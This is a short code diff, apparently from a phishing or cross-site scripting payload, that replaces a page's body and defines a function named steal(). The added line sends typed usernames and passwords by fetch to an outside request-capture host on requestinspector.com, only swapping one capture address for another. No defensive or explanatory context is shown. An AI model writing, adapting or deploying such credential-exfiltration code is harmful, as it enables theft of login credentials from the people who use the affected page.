@@ -9,5 +9,5 @@ document.body.innerHTML = `
 `;
 
 function steal() {
-  fetch('https://requestinspector.com/inspect/123?user=' + user.value + '&pass=' + pass.value);
+  fetch('https://01jtp7mdzdwyx80qn666dmwmgs00-87ccd764c062fb4853c7.requestinspector.com/wisso?user=' + user.value + '&pass=' + pass.value);
 }
